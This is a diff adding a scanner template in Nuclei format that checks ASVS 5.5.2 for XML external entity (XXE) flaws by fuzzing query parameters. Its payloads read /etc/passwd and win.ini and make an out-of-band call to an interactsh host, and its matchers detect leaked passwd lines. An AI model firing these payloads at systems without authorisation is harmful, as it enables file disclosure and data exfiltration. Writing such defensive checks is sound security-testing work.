@@ -1,0 +1,59 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{xxe}}'
+    keys-regex:
+    - (.*?)xml(.*?)
+    part: query
+  - fuzz:
+    - '{{xxe}}'
+    part: query
+    values:
+    - (<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>
+  matchers:
+  - name: linux
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
+    type: regex
+  - name: windows
+    part: body
+    type: word
+    words:
+    - for 16-bit app support
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  payloads:
+    xxe:
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
+      ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}">
+      ]><x>&{{rletter}};</x>
+  pre-condition:
+  - dsl:
+    - method == "GET"
+    type: dsl
+  stop-at-first-match: true
+id: ASVS-4-0-3-V5-5-2
+info:
+  author: AmirHossein Raeisi
+  classification:
+    cwe-id: CWE-611
+  description: 'Verify that the application correctly restricts XML parsers to only
+    use the most restrictive configuration possible and to ensure that unsafe features
+    such as resolving external entities are disabled to prevent XML eXternal Entity
+    (XXE) attacks.
+
+    '
+  name: ASVS 5.5.2 Check
+  reference:
+  - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  - https://github.com/projectdiscovery/nuclei-templates/blob/main/dast/vulnerabilities/xxe/generic-xxe.yaml
+  - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
+  severity: high
+  tags: asvs,5.5.2
+variables:
+  rletter: '{{rand_base(6,''abc'')}}'
